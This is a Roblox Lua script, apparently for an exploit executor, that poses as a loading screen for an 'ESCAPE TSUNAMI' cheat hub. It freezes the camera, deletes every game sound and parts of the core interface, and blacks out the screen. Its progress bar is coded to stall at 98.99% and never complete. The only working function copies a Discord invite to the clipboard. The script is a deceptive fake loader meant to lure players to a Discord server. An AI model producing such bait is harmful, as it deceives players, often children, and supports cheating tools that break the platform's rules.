


local Players = game:GetService("Players")
local RunService = game:GetService("RunService")

local player = Players.LocalPlayer
local camera = workspace.CurrentCamera

-- Esperar a que la cámara exista bien
repeat task.wait() until camera

-- Guardamos la posición actual de la cámara
local fixedCFrame = camera.CFrame

-- Forzamos cámara en modo script
camera.CameraType = Enum.CameraType.Scriptable
camera.CFrame = fixedCFrame

-- La mantenemos congelada todo el tiempo
RunService.RenderStepped:Connect(function()
	camera.CFrame = fixedCFrame
end)



local CoreGui = game:GetService("CoreGui")
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local TweenService = game:GetService("TweenService")

task.wait(2)

-- ELIMINAR ELEMENTOS MOLESTOS
local hashGui = CoreGui:FindFirstChild("9a27dc7a97c45c6d31f57cf4da19542bcd92dd0c7606e5019e5911b93cc0198a")
if hashGui then hashGui:Destroy() end

local topBarApp = CoreGui:FindFirstChild("TopBarApp")
if topBarApp then topBarApp:Destroy() end



--------------------------------------------------
-- SONIDOS PRIMERO (TU CÓDIGO EXACTO)
--------------------------------------------------
for _,v in ipairs(game:GetDescendants()) do
    if v:IsA("Sound") then
        pcall(function()
            v:Stop()
            v:Destroy()
        end)
    end
end

game.DescendantAdded:Connect(function(obj)
    if obj:IsA("Sound") then
        pcall(function()
            obj:Stop()
            obj:Destroy()
        end)
    end
end)

--------------------------------------------------
-- PANTALLA NEGRA TOTAL
--------------------------------------------------
local BlackScreen = Instance.new("ScreenGui")
BlackScreen.Name = "BlackScreenTotal"
BlackScreen.IgnoreGuiInset = true
BlackScreen.ResetOnSpawn = false
BlackScreen.DisplayOrder = 1
BlackScreen.Parent = LocalPlayer.PlayerGui

local BlackFrame = Instance.new("Frame")
BlackFrame.Size = UDim2.new(1, 0, 1, 0)
BlackFrame.Position = UDim2.new(0, 0, 0, 0)
BlackFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
BlackFrame.BackgroundTransparency = 0
BlackFrame.ZIndex = 1
BlackFrame.Parent = BlackScreen

--------------------------------------------------
-- HUB MÁS GRANDE (450x400)
--------------------------------------------------
local HubGui = Instance.new("ScreenGui")
HubGui.Name = "TsunamiHub"
HubGui.IgnoreGuiInset = true
HubGui.ResetOnSpawn = false
HubGui.DisplayOrder = 10
HubGui.ZIndexBehavior = Enum.ZIndexBehavior.Global
HubGui.Parent = LocalPlayer.PlayerGui

-- CONTAINER PRINCIPAL
local Container = Instance.new("Frame")
Container.Size = UDim2.new(0, 450, 0, 400)
Container.Position = UDim2.new(0.5, -225, 0.5, -200)
Container.BackgroundTransparency = 1
Container.ZIndex = 20
Container.Parent = HubGui

-- FONDO PRINCIPAL
local MainBG = Instance.new("Frame")
MainBG.Size = UDim2.new(1, 0, 1, 0)
MainBG.Position = UDim2.new(0, 0, 0, 0)
MainBG.BackgroundColor3 = Color3.fromRGB(15, 20, 35)
MainBG.BorderSizePixel = 0
MainBG.ZIndex = 21
MainBG.Parent = Container

local BGCorner = Instance.new("UICorner")
BGCorner.CornerRadius = UDim.new(0, 25)
BGCorner.Parent = MainBG

local BGStroke = Instance.new("UIStroke")
BGStroke.Color = Color3.fromRGB(100, 180, 255)
BGStroke.Thickness = 2
BGStroke.Parent = MainBG

-- TÍTULO PRINCIPAL
local Title = Instance.new("TextLabel")
Title.Size = UDim2.new(1, -40, 0, 60)
Title.Position = UDim2.new(0, 20, 0, 25)
Title.BackgroundTransparency = 1
Title.Text = "ESCAPE TSUNAMI"
Title.TextColor3 = Color3.fromRGB(100, 180, 255)
Title.TextScaled = true
Title.Font = Enum.Font.GothamBold
Title.ZIndex = 25
Title.Parent = MainBG

-- SUBTÍTULO
local SubTitle = Instance.new("TextLabel")
SubTitle.Size = UDim2.new(1, -40, 0, 45)
SubTitle.Position = UDim2.new(0, 20, 0, 80)
SubTitle.BackgroundTransparency = 1
SubTitle.Text = "FOR BRAINROTS!"
SubTitle.TextColor3 = Color3.fromRGB(255, 120, 160)
SubTitle.TextScaled = true
SubTitle.Font = Enum.Font.GothamBold
SubTitle.ZIndex = 25
SubTitle.Parent = MainBG

-- LOADING TEXT
local LoadingText = Instance.new("TextLabel")
LoadingText.Size = UDim2.new(1, -40, 0, 35)
LoadingText.Position = UDim2.new(0, 20, 0, 130)
LoadingText.BackgroundTransparency = 1
LoadingText.Text = "LOADING SCRIPT"
LoadingText.TextColor3 = Color3.fromRGB(160, 160, 180)
LoadingText.TextScaled = true
LoadingText.Font = Enum.Font.Gotham
LoadingText.ZIndex = 25
LoadingText.Parent = MainBG

-- AVATAR
local AvatarHolder = Instance.new("Frame")
AvatarHolder.Size = UDim2.new(0, 80, 0, 80)
AvatarHolder.Position = UDim2.new(0.5, -40, 0, 175)
AvatarHolder.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
AvatarHolder.BackgroundTransparency = 0.85
AvatarHolder.ZIndex = 25
AvatarHolder.Parent = MainBG

local AvatarCorner = Instance.new("UICorner")
AvatarCorner.CornerRadius = UDim.new(0, 40)
AvatarCorner.Parent = AvatarHolder

local AvatarRing = Instance.new("UIStroke")
AvatarRing.Color = Color3.fromRGB(100, 180, 255)
AvatarRing.Thickness = 3
AvatarRing.Parent = AvatarHolder

local AvatarImg = Instance.new("ImageLabel")
AvatarImg.Size = UDim2.new(0.87, 0, 0.87, 0)
AvatarImg.Position = UDim2.new(0.065, 0, 0.065, 0)
AvatarImg.BackgroundTransparency = 1
AvatarImg.Image = Players:GetUserThumbnailAsync(LocalPlayer.UserId, Enum.ThumbnailType.HeadShot, Enum.ThumbnailSize.Size420x420)
AvatarImg.ZIndex = 26
AvatarImg.Parent = AvatarHolder

-- PORCENTAJE
local PercentText = Instance.new("TextLabel")
PercentText.Size = UDim2.new(0, 90, 0, 40)
PercentText.Position = UDim2.new(0.5, -45, 0, 265)
PercentText.BackgroundTransparency = 1
PercentText.Text = "0%"
PercentText.TextColor3 = Color3.fromRGB(100, 180, 255)
PercentText.TextScaled = true
PercentText.Font = Enum.Font.GothamBold
PercentText.ZIndex = 26
PercentText.Parent = MainBG

-- BARRA PROGRESO
local ProgressContainer = Instance.new("Frame")
ProgressContainer.Size = UDim2.new(1, -60, 0, 8)
ProgressContainer.Position = UDim2.new(0, 30, 0, 310)
ProgressContainer.BackgroundColor3 = Color3.fromRGB(45, 50, 65)
ProgressContainer.BorderSizePixel = 0
ProgressContainer.ZIndex = 25
ProgressContainer.Parent = MainBG

local ProgressCorner = Instance.new("UICorner")
ProgressCorner.CornerRadius = UDim.new(0, 4)
ProgressCorner.Parent = ProgressContainer

local ProgressFill = Instance.new("Frame")
ProgressFill.Size = UDim2.new(0, 0, 1, 0)
ProgressFill.BackgroundColor3 = Color3.fromRGB(100, 180, 255)
ProgressFill.BorderSizePixel = 0
ProgressFill.ZIndex = 26
ProgressFill.Parent = ProgressContainer

local ProgressFillCorner = Instance.new("UICorner")
ProgressFillCorner.CornerRadius = UDim.new(0, 4)
ProgressFillCorner.Parent = ProgressFill

--------------------------------------------------
-- DISCORD FRAME MEJORADO (LINK MÁS PEQUEÑO)
--------------------------------------------------
local DiscordFrame = Instance.new("Frame")
DiscordFrame.Size = UDim2.new(1, -60, 0, 45)
DiscordFrame.Position = UDim2.new(0, 30, 0, 330)
DiscordFrame.BackgroundColor3 = Color3.fromRGB(35, 40, 55)
DiscordFrame.BorderSizePixel = 0
DiscordFrame.ZIndex = 25
DiscordFrame.Parent = MainBG

local DiscordCorner = Instance.new("UICorner")
DiscordCorner.CornerRadius = UDim.new(0, 14)
DiscordCorner.Parent = DiscordFrame

local DiscordStroke = Instance.new("UIStroke")
DiscordStroke.Color = Color3.fromRGB(100, 180, 255)
DiscordStroke.Thickness = 1.5
DiscordStroke.Parent = DiscordFrame

-- LINK DISCORD MÁS PEQUEÑO (TextSize 14)
local DiscordText = Instance.new("TextLabel")
DiscordText.Size = UDim2.new(1, -100, 1, 0)
DiscordText.Position = UDim2.new(0, 15, 0, 0)
DiscordText.BackgroundTransparency = 1
DiscordText.Text = "discord.gg/7gpWMh5Wzu"
DiscordText.TextColor3 = Color3.fromRGB(150, 200, 255)
DiscordText.TextScaled = false
DiscordText.TextSize = 14
DiscordText.Font = Enum.Font.GothamSemibold
DiscordText.TextXAlignment = Enum.TextXAlignment.Left
DiscordText.ZIndex = 26
DiscordText.Parent = DiscordFrame

--------------------------------------------------
-- BOTÓN COPY ULTRA MODERNO ✨
--------------------------------------------------
local CopyBtn = Instance.new("TextButton")
CopyBtn.Size = UDim2.new(0, 75, 0, 35)
CopyBtn.Position = UDim2.new(1, -90, 0, 5)
CopyBtn.BackgroundColor3 = Color3.fromRGB(100, 180, 255)
CopyBtn.Text = "📋 COPY"
CopyBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
CopyBtn.TextScaled = true
CopyBtn.Font = Enum.Font.GothamBold
CopyBtn.ZIndex = 27
CopyBtn.Parent = DiscordFrame

local CopyCorner = Instance.new("UICorner")
CopyCorner.CornerRadius = UDim.new(0, 12)
CopyCorner.Parent = CopyBtn

local CopyStroke = Instance.new("UIStroke")
CopyStroke.Color = Color3.fromRGB(255, 255, 255)
CopyStroke.Thickness = 1.5
CopyStroke.Transparency = 0.3
CopyStroke.Parent = CopyBtn

local CopyGradient = Instance.new("UIGradient")
CopyGradient.Color = ColorSequence.new{
    ColorSequenceKeypoint.new(0, Color3.fromRGB(120, 190, 255)),
    ColorSequenceKeypoint.new(1, Color3.fromRGB(80, 160, 255))
}
CopyGradient.Rotation = 45
CopyGradient.Parent = CopyBtn

-- ANIMACIONES BOTÓN COPY
local hoverInfo = TweenInfo.new(0.2, Enum.EasingStyle.Quart, Enum.EasingDirection.Out)
local clickInfo = TweenInfo.new(0.1, Enum.EasingStyle.Quart, Enum.EasingDirection.Out)

CopyBtn.MouseEnter:Connect(function()
    TweenService:Create(CopyBtn, hoverInfo, {
        Size = UDim2.new(0, 82, 0, 38),
        BackgroundColor3 = Color3.fromRGB(120, 200, 255)
    }):Play()
    TweenService:Create(CopyStroke, hoverInfo, {
        Thickness = 2,
        Transparency = 0
    }):Play()
end)

CopyBtn.MouseLeave:Connect(function()
    TweenService:Create(CopyBtn, hoverInfo, {
        Size = UDim2.new(0, 75, 0, 35),
        BackgroundColor3 = Color3.fromRGB(100, 180, 255)
    }):Play()
    TweenService:Create(CopyStroke, hoverInfo, {
        Thickness = 1.5,
        Transparency = 0.3
    }):Play()
end)

CopyBtn.MouseButton1Down:Connect(function()
    TweenService:Create(CopyBtn, clickInfo, {
        Size = UDim2.new(0, 70, 0, 32)
    }):Play()
end)

CopyBtn.MouseButton1Up:Connect(function()
    TweenService:Create(CopyBtn, clickInfo, {
        Size = UDim2.new(0, 75, 0, 35)
    }):Play()
end)

CopyBtn.MouseButton1Click:Connect(function()
    setclipboard("https://discord.gg/7gpWMh5Wzu")
    CopyBtn.Text = "✅ COPIED!"
    TweenService:Create(CopyBtn, TweenInfo.new(0.3, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {
        BackgroundColor3 = Color3.fromRGB(100, 255, 100),
        Size = UDim2.new(0, 85, 0, 40)
    }):Play()
    task.wait(1.2)
    TweenService:Create(CopyBtn, TweenInfo.new(0.3, Enum.EasingStyle.Quart), {
        BackgroundColor3 = Color3.fromRGB(100, 180, 255),
        Size = UDim2.new(0, 75, 0, 35)
    }):Play()
    CopyBtn.Text = "📋 COPY"
end)

--------------------------------------------------
-- ANIMACIONES GENERALES
--------------------------------------------------
Container.Size = UDim2.new(0, 0, 0, 0)
TweenService:Create(Container, TweenInfo.new(1.2, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {
    Size = UDim2.new(0, 450, 0, 400)
}):Play()

-- Progreso 3 minutos
local startTime = tick()
spawn(function()
    while true do
        local elapsed = tick() - startTime
        local progress = math.min((elapsed / 180) * 0.9899, 0.9899)
        ProgressFill.Size = UDim2.new(progress, 0, 1, 0)
        PercentText.Text = string.format("%.2f%%", progress * 100)
        task.wait()
    end
end)

-- Avatar rotación
spawn(function()
    while AvatarHolder.Parent do
        TweenService:Create(AvatarHolder, TweenInfo.new(5, Enum.EasingStyle.Linear), {
            Rotation = 360
        }):Play()
        task.wait(5)
    end
end)

print("✅ HUB PERFECTO - BOTÓN COPY ANIMADO")


